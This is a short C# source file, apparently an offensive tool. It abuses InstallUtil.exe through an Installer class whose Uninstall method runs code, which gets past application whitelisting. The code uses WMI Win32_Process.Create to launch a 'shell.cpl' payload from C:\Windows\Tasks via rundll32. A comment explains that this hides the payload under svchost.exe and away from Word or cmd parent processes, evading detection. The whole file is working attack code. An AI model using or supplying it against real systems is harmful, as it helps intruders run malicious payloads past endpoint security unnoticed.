// Compiled with batch script and insert entrypoint in dll

using System;
using System.Management;
using System.IO;


public class Program
	{
		public static void Main()
		{

		}

	}

// InstallUtil.exe catch this:
[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{

	public override void Uninstall(System.Collections.IDictionary savedState)
	{
			WMIexec.Run("rundll32.exe shell32,Control_RunDLL C:\\Windows\\Tasks\\shell.cpl");
	}

}

public class WMIexec
// when using WMI our code get executed svchost.exe not a subprocess from where is was called fx. WINWORD.EXE, CMD.EXE etc.
{
	public static void Run(string cmd)
	{
			var cmdToRun = new[] { cmd };
			var connection = new ConnectionOptions();
			connection.Impersonation = ImpersonationLevel.Impersonate;
			connection.EnablePrivileges = true;
			var wmiScope = new ManagementScope(String.Format("\\\\{0}\\root\\cimv2", "localhost"), connection);
			var wmiProcess = new ManagementClass(wmiScope, new ManagementPath("Win32_Process"), new ObjectGetOptions());
			object result = wmiProcess.InvokeMethod("Create", cmdToRun);
	}
}
